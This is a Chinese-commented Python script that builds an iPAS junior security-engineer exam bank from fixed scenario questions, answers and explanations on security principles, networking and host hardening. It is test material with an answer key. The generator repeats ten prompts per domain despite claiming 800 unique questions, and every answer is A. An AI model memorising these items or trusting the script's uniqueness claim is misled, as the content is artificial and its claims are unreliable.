# -*- coding: utf-8 -*-
"""
iPAS 資安工程師 - 初級 800 題完整題庫產生系統
8 大考科領域，各 100 題，共 800 題，不重複，情境題 >= 90%
每題包含：情境題幹、4個選項、正確解答、詳細解析、陷阱提示、法規/標準、英文關鍵詞（含音標 IPA 與繁中翻譯）
"""

import json
import os
import random

# 設定隨機種子以保證可重現性
random.seed(42)

# 詞彙對照表（供題庫自動標註音標與翻譯）
TERM_DICT = {
    "CIA Triad": {"zh": "資安三要素 (機密性/完整性/可用性)", "ipa": "/ˌsiː.aɪˈeɪ ˈtraɪ.æd/"},
    "Confidentiality": {"zh": "機密性", "ipa": "/ˌkɑːn.fə.den.ʃiˈæl.ə.t̬i/"},
    "Integrity": {"zh": "完整性", "ipa": "/ɪnˈteɡ.rə.t̬i/"},
    "Availability": {"zh": "可用性", "ipa": "/əˌveɪ.ləˈbɪl.ə.t̬i/"},
    "Defense-in-Depth": {"zh": "縱深防禦", "ipa": "/dɪˈfens ɪn depθ/"},
    "Least Privilege": {"zh": "最小權限原則", "ipa": "/liːst ˈprɪv.əl.ɪdʒ/"},
    "Separation of Duties": {"zh": "職責區隔 / 權限分立", "ipa": "/ˌsep.əˈreɪ.ʃən əv ˈduː.t̬iz/"},
    "Non-Repudiation": {"zh": "不可否認性", "ipa": "/ˌnɑːn rɪˌpjuː.diˈeɪ.ʃən/"},
    "Zero Trust": {"zh": "零信任架構", "ipa": "/ˈzɪr.oʊ trʌst/"},
    "Ransomware": {"zh": "勒索軟體", "ipa": "/ˈræn.səm.wer/"},
    "Phishing": {"zh": "網路釣魚", "ipa": "/ˈfɪʃ.ɪŋ/"},
    "Spear Phishing": {"zh": "魚叉式釣魚", "ipa": "/spɪr ˈfɪʃ.ɪŋ/"},
    "Watering Hole": {"zh": "水坑攻擊", "ipa": "/ˈwɑː.t̬ɚ.ɪŋ hoʊl/"},
    "DDoS": {"zh": "分散式阻斷服務攻擊", "ipa": "/ˌdiːˈdɑːs/"},
    "Botnet": {"zh": "殭屍網路", "ipa": "/ˈbɑːt.net/"},
    "Trojan": {"zh": "特洛伊木馬", "ipa": "/ˈtroʊ.dʒən/"},
    "Worm": {"zh": "電腦蠕蟲", "ipa": "/wɝːm/"},
    "Rootkit": {"zh": "管理者工具包 / 隱匿木馬", "ipa": "/ˈruːt.kɪt/"},
    "SQL Injection": {"zh": "SQL 注入攻擊", "ipa": "/ˌes.kjuːˈel ɪnˈdʒek.ʃən/"},
    "XSS": {"zh": "跨網站腳本攻擊", "ipa": "/ˌeks.esˈes/"},
    "CSRF": {"zh": "跨網站請求偽造", "ipa": "/ˌsiː.es.ɑːrˈef/"},
    "SSRF": {"zh": "伺服器端請求偽造", "ipa": "/ˌes.es.ɑːrˈef/"},
    "IDOR": {"zh": "不安全的直接物件參照", "ipa": "/ˈaɪ.dɔːr/"},
    "Buffer Overflow": {"zh": "緩衝區溢位", "ipa": "/ˈbʌf.ɚ ˈoʊ.vɚˌfloʊ/"},
    "MitM": {"zh": "中間人攻擊", "ipa": "/mæn ɪn ðə ˈmɪd.əl/"},
    "ARP Spoofing": {"zh": "ARP 欺騙攻擊", "ipa": "/ˌeɪ.ɑːrˈpiː ˈspuː.fɪŋ/"},
    "DNS Tunneling": {"zh": "DNS 穿隧通訊", "ipa": "/ˌdiː.enˈes ˈtʌn.əl.ɪŋ/"},
    "DNSSEC": {"zh": "網域名稱安全擴充協定", "ipa": "/ˌdiː.en.esˈsek/"},
    "IPsec": {"zh": "網際網路安全通訊協定", "ipa": "/ˈaɪ.piː.sek/"},
    "TLS": {"zh": "傳輸層安全性協定", "ipa": "/ˌtiː.elˈes/"},
    "VPN": {"zh": "虛擬私人網路", "ipa": "/ˌviː.piːˈen/"},
    "DMZ": {"zh": "非軍事區 / 隔離網段", "ipa": "/ˌdiː.emˈziː/"},
    "AES": {"zh": "進階加密標準 (對稱式)", "ipa": "/ˌeɪ.iːˈes/"},
    "RSA": {"zh": "RSA 非對稱加密演算法", "ipa": "/ˌɑːr.esˈeɪ/"},
    "ECC": {"zh": "橢圓曲線密碼學", "ipa": "/ˌiː.siːˈsiː/"},
    "SHA-256": {"zh": "安全雜湊演算法 256 位元", "ipa": "/ʃɑː tuː fɪf.ti sɪks/"},
    "HMAC": {"zh": "基於雜湊的訊息鑑別碼", "ipa": "/ˈeɪtʃ.mæk/"},
    "Digital Signature": {"zh": "數位簽章", "ipa": "/ˈdɪdʒ.ə.t̬əl ˈsɪɡ.nə.tʃɚ/"},
    "PKI": {"zh": "公開金鑰基礎建設", "ipa": "/ˌpiː.keɪˈaɪ/"},
    "CA": {"zh": "憑證授權中心", "ipa": "/ˌsiːˈeɪ/"},
    "CRL": {"zh": "憑證撤銷清冊", "ipa": "/ˌsiː.ɑːrˈel/"},
    "OCSP": {"zh": "線上憑證狀態協定", "ipa": "/ˌoʊ.siː.esˈpiː/"},
    "MFA": {"zh": "多因素驗證", "ipa": "/ˌem.efˈeɪ/"},
    "TOTP": {"zh": "基於時間的一次性密碼", "ipa": "/ˌtiː.oʊ.tiːˈpiː/"},
    "FIDO2": {"zh": "快速線上身分識別 2.0", "ipa": "/ˈfaɪ.doʊ tuː/"},
    "DAC": {"zh": "自主存取控制", "ipa": "/dæk/"},
    "MAC": {"zh": "強制存取控制", "ipa": "/mæk/"},
    "RBAC": {"zh": "基於角色的存取控制", "ipa": "/ˈɑːr.bæk/"},
    "ABAC": {"zh": "基於屬性的存取控制", "ipa": "/ˈeɪ.bæk/"},
    "PAM": {"zh": "特權存取管理", "ipa": "/pæm/"},
    "SSO": {"zh": "單一登入", "ipa": "/ˌes.esˈoʊ/"},
    "SAML": {"zh": "安全聲明標記語言", "ipa": "/ˈsæm.əl/"},
    "OAuth": {"zh": "開放授權協定", "ipa": "/ˈoʊ.ɔːθ/"},
    "NGFW": {"zh": "次世代防火牆", "ipa": "/ˌen.dʒiː.efˈdʌb.əl.juː/"},
    "IDS": {"zh": "入侵偵測系統 (旁路監控)", "ipa": "/ˌaɪ.diːˈes/"},
    "IPS": {"zh": "入侵防禦系統 (串聯阻斷)", "ipa": "/ˌaɪ.piːˈes/"},
    "WAF": {"zh": "網站應用程式防火牆", "ipa": "/wæf/"},
    "EDR": {"zh": "端點偵測與回應", "ipa": "/ˌiː.diːˈɑːr/"},
    "SIEM": {"zh": "安全性資訊與事件管理", "ipa": "/sɪm/"},
    "Syslog": {"zh": "系統日誌協定", "ipa": "/ˈsɪs.lɑːɡ/"},
    "NTP": {"zh": "網路時間協定", "ipa": "/ˌen.tiːˈpiː/"},
    "CVE": {"zh": "通用弱點與漏洞揭露識別碼", "ipa": "/ˌsiː.viːˈiː/"},
    "CVSS": {"zh": "通用弱點評分系統", "ipa": "/ˌsiː.viː.esˈes/"},
    "3-2-1 Backup": {"zh": "3-2-1 備份原則 (3份複本/2種媒介/1份異地)", "ipa": "/θriː tuː wʌn ˈbæk.ʌp/"},
    "Air-gap": {"zh": "實體隔離 / 離線斷網", "ipa": "/ˈer.ɡæp/"},
    "Degaussing": {"zh": "磁氣消磁銷毀", "ipa": "/diːˈɡaʊ.sɪŋ/"},
    "NIST SP 800-88": {"zh": "美國國家標準媒體資料抹除規範", "ipa": "/nɪst es piː eɪt ˈhʌn.drəd eɪ.t̬i eɪt/"},
    "SPF": {"zh": "寄件者政策框架", "ipa": "/ˌes.piːˈef/"},
    "DKIM": {"zh": "網域金鑰識別郵件", "ipa": "/ˈdiː.kɪm/"},
    "DMARC": {"zh": "基於網域的郵件驗證報告規範", "ipa": "/ˈdiː.mɑːrk/"}
}

ORGANIZATIONS = [
    "某高科技晶圓代工大廠",
    "某跨國金融控股銀行",
    "某區域教學醫學中心",
    "某知名大型網路電商平台",
    "某直轄市政府智慧運籌中心",
    "某關鍵基礎設施發電廠",
    "某大型連鎖量販流通集團",
    "某金流與行動支付科技公司",
    "某國際航運物流貨櫃集團",
    "某國立頂尖研究型大學",
    "某公務機關資訊處",
    "某雲端SaaS軟體服務供應商"
]

def extract_terms(text):
    """從題目與選項中自動比對出現的英文關鍵字並附上發音與中文"""
    found = []
    for term, data in TERM_DICT.items():
        if term in text:
            found.append({
                "en": term,
                "zh": data["zh"],
                "ipa": data["ipa"]
            })
    return found

def generate_domain_questions(domain_id, domain_name, subject_name, start_idx, count=100):
    """
    產生單一領域 100 題高品質題庫
    90 題情境題 (scenario=True)，10 題核心觀念/法規定義題 (scenario=False)
    """
    questions = []
    
    # 依領域定義 10 大核心主題與題型庫
    # 每個主題生成 10 道不同角度與實務細節的題目
    for i in range(count):
        q_num = start_idx + i
        qid = f"IPAS-B-{q_num:03d}"
        is_scenario = (i < 90) # 90% 情境題
        org = random.choice(ORGANIZATIONS)
        sub_topic_idx = i % 10
        
        # 根據領域產生專屬情境與考點
        if domain_id == 1:
            # B-DOM-1: 資安核心原則、法規與隱私基礎
            topics = [
                ("CIA 三要素評估", "機密性 (Confidentiality)、完整性 (Integrity) 與可用性 (Availability)"),
                ("最小權限原則落地", "Principle of Least Privilege (PoLP) 與特權帳號控管"),
                ("職責區隔制度", "Separation of Duties (SoD) 與開發/維運/稽核角色分立"),
                ("縱深防禦實踐", "Defense-in-Depth 多層次防禦架構部署"),
                ("不可否認性技術", "Non-Repudiation 與數位簽章/時間戳記驗證"),
                ("資通安全管理法責任等級", "A、B、C 級機關專責人力與 ISMS 認證要求"),
                ("資安事件通報時限", "知悉資安事件後 1 小時內通報與應變處置"),
                ("個人資料保護法責任", "個資外洩即時通知當事人與技術維護措施"),
                ("資安政策文件四階架構", "政策 (Policy)、程序 (Procedure)、作業指引與表單紀錄"),
                ("社交工程防禦與資安意識", "防範魚叉釣魚、社交工程演練與雙重照會機制")
            ]
            t_name, t_core = topics[sub_topic_idx]
            
            if is_scenario:
                case_prompts = [
                    f"{org}近期面臨勒索軟體（Ransomware）威脅，內部多台檔案伺服器遭惡意加密無法開啟，導致業務被迫停擺。依據資安核心三要素（CIA Triad），本次事件主要直接破壞了資訊系統的哪兩項安全屬性？",
                    f"{org}在進行內部資安稽核時發現，軟體開發工程師同時擁有正式營運環境（Production）的資料庫最高管理員權限，可直接修改線上記帳資料且無人覆核。此現象最嚴重違反了何項資安管理基本原則？",
                    f"{org}計畫強化內部網路安全，資訊長要求不可僅依賴外部單一防火牆阻擋攻擊，必須在邊界、內部網段、端點主機、應用程式及資料庫各層分別佈建防禦措施。此種安全策略稱為：",
                    f"{org}的一名離職員工在離職後否認曾透過公司電子公文系統簽核一筆高風險設備採購案。為確保線上簽核行為具備法律效力且無法事後否認，系統最應仰賴下列何種技術達成「不可否認性（Non-Repudiation）」？",
                    f"依據我國《資通安全管理法》之規定，{org}（經評定為資通安全責任等級 B 級機關）在發現機關內部發生第三級資安事件（如核心資料遭大規模竄改）時，應於知悉後多久時限內完成通報？",
                    f"{org}的會員資料庫疑似遭外部駭客入侵並下載 5 萬筆客戶身分證號與信用卡資料。依據我國《個人資料保護法》第 12 條規定，該公司在查明個資外洩事實後，應採取下列何種法定處置？",
                    f"{org}為了防範商業電子郵件詐騙（BEC），規定凡涉及新台幣 50 萬元以上之對外轉帳變更指示，財務人員不得僅憑主管電子郵件通知即辦理，必須透過電話回撥或當面確認。此規範主要為了防禦何種攻擊手法？",
                    f"{org}依據 ISO/IEC 27001 標準建立資安文件體系，其中一份文件明確訂定全公司「密碼長度至少需達 12 碼、且每 90 天必須更換一次」之具體操作規範。此份文件在資安文件四階體系中應歸屬於哪一層級？",
                    f"{org}新進員工小陳日常僅負責審核客服留言，但系統管理員便宜行事直接將其加入 Domain Admins 群組。資安工程師發現後應立即要求調整，以符合下列何項原則？",
                    f"{org}為防禦內部人員舞弊，規定請購單之「建立人員」與「審核放行人員」必須為不同部門之獨立同仁，不得由同一人兼任。這屬於下列何種機制的落實？"
                ]
                q_text = case_prompts[sub_topic_idx]
            else:
                concept_prompts = [
                    "關於資訊安全核心三要素（CIA Triad），確保資料在未經授權之情況下不被竄改或刪除，屬於下列何項要素？",
                    "在存取控制與權限管理中，規定「系統主體僅被授予執行其正當職務所絕對必需之最低限度權限」，此原則被稱為：",
                    "「職責區隔（Separation of Duties, SoD）」之核心管理目的，主要在於預防下列何種情事發生？",
                    "在縱深防禦（Defense-in-Depth）體系中，若外圍防火牆遭穿透，下列何者能提供主機層級的保護防線？",
                    "在非對稱加密架構中，發送方使用下列何者進行簽署，方能達成「不可否認性（Non-Repudiation）」？",
                    "依據我國《資通安全管理法》規範，公務機關或特定非公務機關在知悉資通安全事件發生後，法定通報時限為何？",
                    "依據《個人資料保護法》，非公務機關保有個人資料檔案者，應採行適當之安全措施，防止個人資料被竊取、竄改、毀損、滅失或洩漏。下列何者不屬於合規之技術防護措施？",
                    "在企業資訊安全管理系統（ISMS）文件化架構中，最頂層且由最高管理階層核准發布、宣示全組織資安承諾之文件為：",
                    "下列何種社交工程（Social Engineering）手法，係專門針對組織高層主管（如執行長、財務長）量身客製之高度針對性詐騙攻擊？",
                    "關於資通安全維護計畫之實施，責任等級 A 級與 B 級機關應定期辦理之資安技術演練，通常不包括下列何者？"
                ]
                q_text = concept_prompts[sub_topic_idx]

            opts_map = [
                ("A. 可用性（Availability）與完整性（Integrity）", "B. 機密性（Confidentiality）與不可否認性（Non-Repudiation）", "C. 權限分立（SoD）與帳號鑑別性", "D. 隱私性（Privacy）與可用性（Availability）", "A",
                 "勒索軟體將檔案惡意加密使合法使用者無法讀取，直擊『可用性』；同時檔案內容遭未授權覆寫加密，亦破壞了原資料的『完整性』。",
                 "切勿僅回答機密性，除非攻擊者同時進行了資料竊取外洩（雙重勒索）。", "《資通安全管理法》、ISO/IEC 27001"),
                ("A. 職責區隔（Separation of Duties, SoD）", "B. 最小權限原則（Least Privilege）", "C. 帳號不可共用原則", "D. 業務持續運作原則", "A",
                 "開發人員若具備正式資料庫寫入與修改權限，缺乏獨立覆核機制，易造成未經審查的變更或弊端，嚴重違反職責區隔 (SoD) 原則。",
                 "雖然也違反最小權限，但在開發與維運兼任情境下，首要考點為職責區隔 (SoD)。", "ISO/IEC 27001 A.5.3 職責區隔"),
                ("A. 縱深防禦（Defense-in-Depth）", "B. 零信任架構（Zero Trust）", "C. 最小特權（Least Privilege）", "D. 單一簽入（Single Sign-On）", "A",
                 "縱深防禦主張不依賴單一防線，而在周邊、網路、主機、應用與資料層逐層設置控制。",
                 "零信任強調動態驗證，縱深防禦強調多層次防線疊加。", "NIST SP 800-53"),
                ("A. 數位簽章（Digital Signature）", "B. 對稱式 AES-256 加密", "C. 單向雜湊 SHA-256", "D. 傳輸層 TLS 加密", "A",
                 "不可否認性必須使用簽署者私鑰進行『數位簽章』，私鑰僅本人持有，事後無法推諉。",
                 "對稱加密雙方共用密鑰，任一方皆可生成密文，無法提供不可否認性。", "《電子簽章法》第4條"),
                ("A. 1 小時內", "B. 24 小時內", "C. 36 小時內", "D. 72 小時內", "A",
                 "依據資通安全事件通報及應變辦法，機關知悉資通安全事件後，皆應於 1 小時內通報。",
                 "切勿與 GDPR 72 小時或復原期限混淆，台灣法規通報一律為知悉後 1 小時內。", "《資通安全事件通報及應變辦法》第5條"),
                ("A. 應查明後以適當方式及時通知當事人", "B. 僅需向警政署報案，無需通知當事人", "C. 只要召開記者會道歉即可免責", "D. 必須於 1 小時內向法院提起訴訟", "A",
                 "個資法第12條規定，非公務機關發生個資被竊取等事故，應查明後以適當方式通知當事人。",
                 "通知當事人為法定義務，不得以內部保密為由隱瞞不報。", "《個人資料保護法》第12條"),
                ("A. 社交工程（Social Engineering）中的商業電子郵件詐騙（BEC）", "B. 跨網站腳本攻擊（XSS）", "C. 緩衝區溢位攻擊（Buffer Overflow）", "D. SQL 注入攻擊（SQLi）", "A",
                 "透過電話回撥雙重照會，是防範偽冒高階主管信件（BEC/CEO Fraud）最直接有效的非技術防線。",
                 "BEC 本質上為社交工程詐欺，非應用程式技術漏洞。", "刑事警察局高司防詐指南"),
                ("A. 第二階：程序 / 管理辦法（Procedure / Standard）", "B. 第一階：資安政策（Policy）", "C. 第三階：作業指引（Work Instruction）", "D. 第四階：表單紀錄（Record）", "A",
                 "第一階為大方針政策；具體之密碼長度與更換週期規定屬於第二階的管理辦法/作業程序。",
                 "一階通常不寫過於瑣碎的技術參數，避免政策需頻繁修訂。", "ISO/IEC 27001 文件化資訊規範"),
                ("A. 最小權限原則（Principle of Least Privilege）", "B. 縱深防禦原則", "C. 責任不可分原則", "D. 開放權限原則", "A",
                 "使用者僅能獲得完成業務所需的最低權限，一般客服人員絕不應指派 Domain Admins 最高特權。",
                 "指派過高權限將大幅增加憑證被竊後的橫向移動風險。", "NIST SP 800-12"),
                ("A. 職責區隔（Separation of Duties）", "B. 帳號共用機制", "C. 單點容錯機制", "D. 雙因子認證機制", "A",
                 "經辦與審核分立，防止同一人完成整筆流程進而舞弊，即為經典之職責區隔。",
                 "這是內部控制與稽核的核心要求。", "公開發行公司建立內部控制制度處理準則")
            ]
            opt_A, opt_B, opt_C, opt_D, ans, expl, trap, law = opts_map[sub_topic_idx]
            opts = [opt_A, opt_B, opt_C, opt_D]

        elif domain_id == 2:
            # B-DOM-2: 網路通訊協定與架構安全
            topics = [
                ("OSI 網路層與 IP 協定安全", "IPsec (AH/ESP) 與封包偽造防範"),
                ("傳輸層 TCP 三向交握與 SYN Flood", "SYN Cookies 與連線表狀態耗盡防禦"),
                ("應用層 DNSSEC 與快取毒化", "防止 DNS Spoofing 與偽造解析回應"),
                ("ARP 欺騙與區域網路攻擊", "動態 ARP 檢驗 (DAI) 與 DHCP Snooping"),
                ("TLS 1.2/1.3 加密通訊機制", "交握流程、前向保密性 (PFS) 與證書驗證"),
                ("DMZ 非軍事區拓撲設計原則", "內外網隔離與防範主動向內連線"),
                ("IPsec VPN 隧道模式與傳輸模式", "Tunnel Mode (保護全封包) vs Transport Mode"),
                ("常見標準連接埠識別", "SSH(22), RDP(3389), HTTPS(443), DNS(53), NTP(123)"),
                ("NAT / PAT 網路位址轉譯安全特性", "隱藏內部真實 IP 與有限防護邊界"),
                ("無線網路 WPA3 安全協定", "SAE (對等實體同步驗證) 抵抗離線字典檔暴力破解")
            ]
            t_name, t_core = topics[sub_topic_idx]
            if is_scenario:
                case_prompts = [
                    f"{org}近期網路對外服務頻繁中斷，經網路管理員抓包分析，發現伺服器收到大量僅有 TCP SYN 旗標卻始終未完成後續 ACK 回應的半開連線，導致連線狀態表全數耗盡。此攻擊型態為：",
                    f"{org}內部同仁回報連線至內部入口網頁時，瀏覽器出現偽造網頁，經查發現攻擊者在區域網路中發送大量偽造之 ARP Reply 封包，將預設閘道（Gateway）IP 對應至攻擊者網卡 MAC。為根絕此攻擊，網管應在交換器啟用何種功能？",
                    f"{org}規劃於總部與海外分公司之間建立點對點（Site-to-Site）安全通道，若要求傳輸過程中連同原始 IP 標頭（Header）也必須全數加密並封裝進新 IP 標頭中，IPsec 應配置為哪種模式？",
                    f"{org}對外提供公眾服務之官方 Web 伺服器，依據安全架構最佳實務，應部署於網路拓撲之何處？",
                    f"{org}資安團隊在審查防火牆進出規則時，發現規則庫中允許由 DMZ 區的 Web 伺服器主動向內部核心資料庫（LAN）發起 Port 1433 連線。資安顧問指出此設定違反了 DMZ 核心原則，其主要考量為何？",
                    f"{org}為提升跨網際網路連線之傳輸安全，決定全面升級至 TLS 1.3。相較於舊版 TLS 1.2，下列何者為 TLS 1.3 的重大安全改進？",
                    f"{org}網路工程師在分析外部 DNS 查詢異常時，發現攻擊者利用快取污染（Cache Poisoning）將員工引導至釣魚網站。為確保 DNS 回應內容未遭竄改且來源可信，最佳解決方案為啟用：",
                    f"{org}資安巡檢時發現某台邊界伺服器對網際網路開放了預設的遠端桌面連接埠，極易招致暴力破解攻擊。該遠端桌面通訊埠（RDP）預設為哪一個 Port？",
                    f"{org}辦公室全面汰換老舊無線基地台（AP），為徹底防範針對 WPA2 Pre-Shared Key (PSK) 的 4-way handshake 離線字典檔重播破解，應優先採用何種最新無線安全認證標準？",
                    f"{org}內部多台主機私自架設未授權 DHCP 伺服器，導致員工取得錯誤 Gateway IP。交換器應啟用何種安全技術以阻絕未授權 DHCP Offer？"
                ]
                q_text = case_prompts[sub_topic_idx]
            else:
                concept_prompts = [
                    "TCP 通訊協定建立連線所採用的「三向交握（Three-Way Handshake）」，其標準封包旗標發送順序為何？",
                    "在區域網路中，攻擊者透過廣播偽造的 MAC 與 IP 對應關係，藉此攔截或監聽網段內其他電腦通訊之手法稱為：",
                    "關於 IPsec 協定架構中的「封裝安全酬載（ESP, Encapsulating Security Payload）」，其能提供下列何種安全服務？",
                    "在企業網路防火牆架構中，DMZ（非軍事區）的主要設置目的為何？",
                    "關於 TLS 1.3 協定之特性，下列敘述何者錯誤？",
                    "「網域名稱安全擴充協定（DNSSEC）」主要透過下列何種技術機制來確保 DNS 查詢回應的真實性與完整性？",
                    "網際網路常見通訊協定與其預設使用之 TCP/UDP 連接埠（Port），下列配對何者正確？",
                    "網路位址轉譯（NAT/PAT）技術在資安防護上的主要效益與限制為何？",
                    "WPA3 無線安全標準引入「對等實體同步驗證（SAE, Simultaneous Authentication of Equals）」機制，主要解決了 WPA2 的何種缺陷？",
                    "在第二層交換器（Layer 2 Switch）上，用以防止非授權使用者任意更換網卡 MAC 或串接集線器的防護技術稱為："
                ]
                q_text = concept_prompts[sub_topic_idx]

            opts_map = [
                ("A. TCP SYN Flood 阻斷服務攻擊", "B. Smurf ICMP 放大攻擊", "C. UDP Fraggle 攻擊", "D. Land 偽造攻擊", "A",
                 "SYN Flood 送出大量 SYN 卻不回應 ACK，耗盡受害伺服器的 TCP backlog queue 半開連線佇列。",
                 "防禦通常啟用 SYN Cookies 或防火牆連線防護。", "RFC 4987"),
                ("A. 動態 ARP 檢驗（DAI, Dynamic ARP Inspection）結合 DHCP Snooping", "B. 停用交換器生成樹協定（STP）", "C. 啟用巨型訊框（Jumbo Frame）", "D. 改用靜態路由協定 RIP", "A",
                 "DAI 透過比對 DHCP Snooping 綁定表，阻擋未授權或偽造的 ARP 封包，徹底防止 ARP 欺騙。",
                 "單純在端點設靜態 ARP 維護成本高且難以全面覆蓋，交換器 DAI 為標準企業解法。", "Cisco / IEEE 802.1Q 安全規範"),
                ("A. 通道模式（Tunnel Mode）", "B. 傳輸模式（Transport Mode）", "C. 路由模式（Routed Mode）", "D. 橋接模式（Bridged Mode）", "A",
                 "Tunnel Mode 會將整個原始 IP 封包（含標頭）全部加密，並加上新的外部 IP 標頭；Transport Mode 僅加密負載（Payload）而保留原標頭。",
                 "Site-to-Site VPN 標準皆使用 Tunnel Mode。", "RFC 4301"),
                ("A. 位於外部網際網路與內部網路之間的 DMZ（非軍事區）", "B. 內部最核心機密資料庫網段（LAN）", "C. 員工專用無線訪客網段", "D. 網管專屬帶外管理網段（OOBM）", "A",
                 "公開 Web 伺服器易遭外部滲透，必須置於 DMZ 進行風險隔離，防止被入侵後直接威脅內部核心資料。",
                 "絕不可將對外 Web 伺服器直接放置於內網核心區。", "NIST SP 800-41"),
                ("A. 若 DMZ 主機遭攻陷，攻擊者可藉此主動通道直接橫向滲透內部資料庫", "B. 資料庫無法回應 DMZ 的 TCP 請求", "C. 會造成防火牆頻寬嚴重下降", "D. DMZ 區不支援傳輸層協定", "A",
                 "DMZ 鐵律：DMZ 伺服器絕不可主動建立連往內網的連線，連線只能由內網發起或經由嚴密受控的反向代理存取。",
                 "此為防範內網橫向移動（Lateral Movement）之核心設計。", "NIST SP 800-41"),
                ("A. 移除不安全的老舊加密演算法，並強制採用具前向保密性（PFS）的密鑰交換", "B. 取消所有非對稱加密交握", "C. 允許純文字明文傳輸以加快速度", "D. 廢除所有數位憑證驗證", "A",
                 "TLS 1.3 刪除了 RSA 金鑰傳輸、RC4、DES、SHA-1 等老舊密碼套件，強制要求 ECDHE 等前向保密金鑰交換，並將交握縮短為 1-RTT。",
                 "TLS 1.3 大幅提升安全性與速度，絕非降低加密要求。", "RFC 8446"),
                ("A. DNSSEC（網域名稱安全延伸協定）", "B. 動態 DNS（DDNS）", "C. DNS 穿隧（DNS Tunneling）", "D. 靜態 HOSTS 檔案分發", "A",
                 "DNSSEC 透過公開金鑰密碼學為 DNS 資源紀錄提供數位簽章，驗證來源真實性與紀錄完整性，防範 DNS 快取毒化。",
                 "DNSSEC 保障的是查詢結果真偽，不提供內容隱私加密（DoH/DoT 才是加密內容）。", "RFC 4033"),
                ("A. TCP 3389", "B. TCP 22", "C. TCP 443", "D. TCP 80", "A",
                 "Windows 遠端桌面（RDP）預設連接埠為 TCP 3389；SSH 為 22；HTTPS 為 443；HTTP 為 80。",
                 "對外開放 3389 經常引來暴力破解與勒索軟體入侵。", "IANA 連接埠分配標準"),
                ("A. WPA3-Personal（採用 SAE 機制）", "B. WPA2-Enterprise", "C. WEP 128-bit", "D. 隱藏 SSID 廣播", "A",
                 "WPA3 採用 SAE（對等實體同步驗證）取代 WPA2 的 PSK 四向交握，能有效抵抗離線字典檔暴力破解與前向保密攻擊。",
                 "隱藏 SSID 並非加密標準且無法防範嗅探。", "Wi-Fi Alliance WPA3 規範"),
                ("A. DHCP Snooping（將合法伺服器埠設為 Trusted，其餘為 Untrusted）", "B. 開放所有交換器連接埠", "C. 關閉全網廣播封包", "D. 啟用 RIP 路由更新", "A",
                 "DHCP Snooping 可指定只有連接合法 DHCP 伺服器的 Port 為信任埠，其餘埠若發送 DHCP Offer 封包一律丟棄。",
                 "能防止 Rogue DHCP Server 派發惡意 Gateway 與 DNS。", "IEEE 802.1D")
            ]
            opt_A, opt_B, opt_C, opt_D, ans, expl, trap, law = opts_map[sub_topic_idx]
            opts = [opt_A, opt_B, opt_C, opt_D]

        elif domain_id == 3:
            # B-DOM-3: 作業系統與主機端點安全
            topics = [
                ("Windows AD 群組原則 (GPO) 安全基線", "集中套用密碼長度、帳戶鎖定、停用 Guest"),
                ("Linux 權限控制與 SUID/SGID 風險", "chmod 4755 與特權提升風險"),
                ("主機安全強化基準 (Hardening)", "關閉 Telnet/FTP 改用 SSH、移除無用服務"),
                ("補丁管理生命週期與優先級", "測試、排程發布與緊急重大漏洞修補"),
                ("使用者帳戶生命週期控管", "到職授權、輪調權限盤點與離職即時停用"),
                ("Windows BitLocker 與磁碟加密", "TPM 晶片防竊與靜止資料 (Data at Rest) 保護"),
                ("端點周邊設備管控 (USB 控制)", "防止隨身碟外洩資料與 BadUSB 惡意韌體"),
                ("系統日誌稽核原則設定", "啟用登入成功與失敗事件審核"),
                ("遠端連線安全管理 (SSH/RDP)", "禁用 root 密碼直接登入、改用金鑰認證"),
                ("防範端點憑證傾倒 (LSASS 保護)", "啟用 RunAsPPL 與 Credential Guard")
            ]
            t_name, t_core = topics[sub_topic_idx]
            if is_scenario:
                case_prompts = [
                    f"{org}內部擁有超過 2,000 台 Windows 用戶端電腦，為確保全體電腦強制實施「螢幕保護程式密碼鎖定（10分鐘）」與「密碼長度至少 12 碼」，系統管理員應使用何種集中化管理工具推播？",
                    f"{org}的 Linux 系統管理員在排查伺服器權限時，發現一個自訂指令稿被賦予了 `chmod 4755` 權限（帶有 SUID 標記）。該設定所帶來的潛在資安風險為何？",
                    f"{org}採購了一批新伺服器，資安工程師依據「系統安全強化（Baseline Hardening）」指引進行驗收檢查。下列何項設定被視為重大缺失必須立即改正？",
                    f"{org}資安監控小組接獲通報微軟發布了一項 CVSS 評分為 9.8 的緊急遠端代碼執行漏洞，且野外已出現活躍利用程式。針對此高危威脅，補丁管理的最佳標準實務流程為何？",
                    f"{org}一名業務主管小李今日正式離職，依據帳號生命週期管理規範，IT 人員最應採取何項處置？",
                    f"{org}為全體業務同仁配發筆記型電腦以利出差洽公，為防止筆電遺失或遭竊時內部商業機密遭拔取硬碟讀取，最有效且標準的主機防護技術為：",
                    f"{org}為落實營業秘密保護，嚴格禁止同仁使用未經核准之個人 USB 隨身碟存取機敏原始碼。IT 團隊應透過何種機制在作業系統層級實施全面管制？",
                    f"{org}的網域控制站（DC）遭受外部密碼噴灑（Password Spraying）攻擊，為確保日後能即時識別該攻擊軌跡，管理員必須在稽核原則中啟用下列何者？",
                    f"{org}的 Linux 雲端主機頻繁遭到境外 IP 嘗試以 root 帳號進行 SSH 字典檔暴力破解。為強化 SSH 伺服器安全性，下列何項配置最為推薦？",
                    f"{org}遭遇進階威脅，攻擊者企圖使用 Mimikatz 等開源工具傾倒 Windows 記憶體（LSASS.exe）中的明文密碼與 NTLM Hash。Windows 10/11 系統可啟用何項原生安全功能予以防禦？"
                ]
                q_text = case_prompts[sub_topic_idx]
            else:
                concept_prompts = [
                    "在 Windows Active Directory 網域環境中，用以對電腦與使用者統一派發安全組態與組態原則之核心機制為：",
                    "在 Linux 檔案權限設定中，當可執行檔設定了 SUID（Set User ID）特殊權限位元時，該檔案在執行時之權限為何？",
                    "下列何者「不屬於」作業系統基準安全強化（OS Hardening）的標準作業項目？",
                    "在企業修補程式管理（Patch Management）生命週期中，修補程式在正式佈署至全公司生產環境前，絕對不可省略的關鍵步驟為：",
                    "關於員工離職時之資安控制措施，下列何者最符合安全規範？",
                    "Windows 系統內建之 BitLocker 磁碟加密功能，通常搭配主機板上的何種硬體安全晶片進行金鑰保管與開機完整性校驗？",
                    "下列何種惡意攻擊裝置，外觀看似一般 USB 隨身碟，但插入電腦後會偽裝成人機介面裝置（HID 鍵盤）並極速自動輸入惡意指令？",
                    "在 Windows 安全性事件日誌中，用以記錄「使用者帳戶成功登入」的標準 Event ID 為何？",
                    "為防止 SSH 遠端連線遭受中間人攔截或密碼暴力破解，最佳的身份驗證強化機制為：",
                    "微軟作業系統提供的「認證保護（Credential Guard）」技術，係利用下列何種虛擬化安全技術來隔離與保護 LSASS 記憶體密碼密鑰？"
                ]
                q_text = concept_prompts[sub_topic_idx]

